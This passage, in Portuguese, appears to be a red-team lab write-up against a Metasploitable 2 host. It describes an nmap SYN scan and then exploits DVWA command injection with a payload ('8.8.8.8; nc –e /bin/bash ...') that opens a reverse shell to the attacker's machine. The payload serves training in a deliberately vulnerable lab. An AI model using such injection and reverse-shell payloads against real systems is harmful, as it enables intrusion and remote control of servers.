
## Reconhecimento
Para começar a exploração da rede interna, o time atacante realizou um scan na rede com o intuito de descobrir os hosts ali presentes, assim como portas abertas, serviços e versões destes.

### NMAP
Portanto fez-se uso da ferramenta “NMAP” (Network Mapper), utilizando do seguinte código:
```bash
nmap -sS –sV -p- 172.22.22.0/24
```
Escaneando por portas hosts, portas abertas, serviços em execução e “Syn scan”, o qual possui a função de ser rápido e não completar o “Three-way Handshake” do protocolo TCP, gerando desta forma menos logs no sistema alvo.

### O alvo
O time atacante possuiu como foco principal o comprometimento do **host 172.22.22.97** (Servidor Web – Metasploitable 2), o qual já é bastante conhecido por suas vulnerabilidades, diante dessa informação foram executados ataques explorando essas brechas de segurança.

O primeiro ataque realizado foi no servidor web “DVWA” (Damn Vulnerable Web Application) que estava em execução no host. Esse ataque foi feito explorando a vulnerabilidade de “Command Injection”, vulnerabilidade esta pertencente a classe de “Injection” presente na terceira posição do projeto “OWASP Top Ten" de 2021. 

Esta vulnerabilidade foi explorada através do código: 
```bash
8.8.8.8; nc –e /bin/bash 10.10.10.99 9999
```
o qual possuiu a função de obter uma shell reversa do servidor web para o atacante (Kali Linux, de IP 10.10.10.99).
Diante do primeiro ataque, obteve-se uma shell do servidor web e então o próximo passo tornou-se em fazer uma escalação de privilégios, saindo do usuário com poucos privilégios para o root do sistema.
